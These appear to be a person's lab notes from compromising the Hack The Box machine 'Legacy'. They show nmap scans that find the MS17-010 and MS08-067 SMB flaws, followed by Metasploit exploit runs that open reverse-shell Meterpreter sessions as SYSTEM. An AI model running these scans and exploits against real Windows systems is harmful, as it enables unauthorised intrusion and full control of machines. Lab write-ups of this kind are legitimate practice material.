# Nmap

#nmap
```bash
> nmap -Pn -p- --min-rate 4000 10.10.10.4
Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-31 16:53 +0700
Nmap scan report for 10.10.10.4
Host is up (0.17s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
51054/tcp filtered unknown
64220/tcp filtered unknown
```

```bash
> nmap -Pn -sCV -p135,139,445 10.10.10.4
Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-31 16:55 +0700
Nmap scan report for 10.10.10.4
Host is up (0.17s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2025-09-05T14:53:33+03:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:71:b5 (VMware)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h27m39s, deviation: 2h07m16s, median: 4d22h57m39s
```

#smbclient 
```bash
msf6 auxiliary(scanner/smb/smb_version) > run
[*] 10.10.10.4:445        - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
[+] 10.10.10.4:445        -   Host is running Windows XP  SP3  (language:English)
[*] 10.10.10.4            - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

# find vulnerabilities on smb services

#nmap 
```zsh
nmap --script "smb-vuln*" 10.10.10.4  
  
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-01 07:55 +0700  
Nmap scan report for 10.10.10.4  
Host is up (0.17s latency).  
Not shown: 997 closed tcp ports (conn-refused)  
PORT    STATE SERVICE  
135/tcp open  msrpc  
139/tcp open  netbios-ssn  
445/tcp open  microsoft-ds  
  
Host script results:  
| smb-vuln-ms17-010:    
|   VULNERABLE:  
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)  
|     State: VULNERABLE  
|     IDs:  CVE:CVE-2017-0143  
|     Risk factor: HIGH  
|       A critical remote code execution vulnerability exists in Microsoft SMBv1  
|        servers (ms17-010).  
|              
|     Disclosure date: 2017-03-14  
|     References:  
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx  
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/  
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143  
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)  
|_smb-vuln-ms10-054: false  
| smb-vuln-ms08-067:    
|   VULNERABLE:  
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)  
|     State: VULNERABLE  
|     IDs:  CVE:CVE-2008-4250  
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,  
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary  
|           code via a crafted RPC request that triggers the overflow during path canonicalization.  
|              
|     Disclosure date: 2008-10-23  
|     References:  
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250  
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
```

# metasploit

```bash
msf6 exploit(windows/smb/ms08_067_netapi) > set rhosts 10.10.10.4  
rhosts => 10.10.10.4  
msf6 exploit(windows/smb/ms08_067_netapi) > run  
[*] Started reverse TCP handler on 10.10.14.2:4444    
[*] 10.10.10.4:445 - Automatically detecting the target...  
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English  
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)  
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...  
[*] Sending stage (177734 bytes) to 10.10.10.4  
[*] Meterpreter session 2 opened (10.10.14.2:4444 -> 10.10.10.4:1040) at 2025-09-01 07:58:26 +0700  
  
meterpreter > getuid  
Server username: NT AUTHORITY\SYSTEM
```

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > run  
[*] Started reverse TCP handler on 10.10.14.2:4444    
[*] 10.10.10.4:445 - Target OS: Windows 5.1  
[*] 10.10.10.4:445 - Filling barrel with fish... done  
[*] 10.10.10.4:445 - <---------------- | Entering Danger Zone | ---------------->  
[*] 10.10.10.4:445 -    [*] Preparing dynamite...  
[*] 10.10.10.4:445 -            [*] Trying stick 1 (x86)...Boom!  
[*] 10.10.10.4:445 -    [+] Successfully Leaked Transaction!  
[*] 10.10.10.4:445 -    [+] Successfully caught Fish-in-a-barrel  
[*] 10.10.10.4:445 - <---------------- | Leaving Danger Zone | ---------------->  
[*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x86499568  
[*] 10.10.10.4:445 - Built a write-what-where primitive...  
[+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!  
[*] 10.10.10.4:445 - Selecting native target  
[*] 10.10.10.4:445 - Uploading payload... DwxhtfrA.exe  
[*] 10.10.10.4:445 - Created \DwxhtfrA.exe...  
[+] 10.10.10.4:445 - Service started successfully...  
[*] Sending stage (177734 bytes) to 10.10.10.4  
[*] 10.10.10.4:445 - Deleting \DwxhtfrA.exe...  
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.4:1039) at 2025-09-01 07:50:51 +0700  
  
meterpreter > getuid  
Server username: NT AUTHORITY\SYSTEM
```